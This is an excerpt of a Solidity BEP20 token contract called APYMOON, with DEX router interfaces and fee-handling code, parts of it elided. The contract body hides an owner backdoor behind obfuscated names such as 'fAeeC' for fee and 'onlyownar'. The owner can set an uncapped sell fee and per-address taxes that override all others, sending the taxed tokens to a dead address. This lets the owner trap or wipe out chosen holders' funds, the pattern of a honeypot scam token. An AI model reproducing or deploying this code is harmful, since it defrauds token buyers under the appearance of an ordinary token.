...
interface IUniswapV2Factory {
    ...
    function fAeeCTo() external view returns (address);
    function fAeeCToSetter() external view returns (address);
    ...
    function setfAeeCTo(address) external;
    function setfAeeCToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfAeeCOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfAeeCOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfAeeCOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfAeeCOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfAeeCOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract APYMOON is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfAeeC = 0;

    uint256 private _defaultBuyfAeeC = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfAeeC;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfAeeC = _value;
    }

    function setSlipfAeeC(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfAeeC[_address] = _value;
    }

    function getSlipfAeeC(address _address) external view onlyownar returns (uint256) {
        return _slipfAeeC[_address];
    }


    function setMAccountfAeeC(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfAeeC(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefAeeCAmount = 0;

        if (rF) {
            uint256 tradefAeeC = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefAeeC = _defaultSellfAeeC;
                }
                if (from == uniswapV2Pair) {

                    tradefAeeC = _defaultBuyfAeeC;
                }
            }
            if (_slipfAeeC[from] > 0) {
                tradefAeeC = _slipfAeeC[from];
            }

            tradefAeeCAmount = _Amount.mul(tradefAeeC).div(100);
        }


        if (tradefAeeCAmount > 0) {
            _balances[from] = _balances[from].sub(tradefAeeCAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefAeeCAmount);
            emit Transfer(from, _deadAddress, tradefAeeCAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefAeeCAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefAeeCAmount);
        emit Transfer(from, _to, _Amount - tradefAeeCAmount);
    }
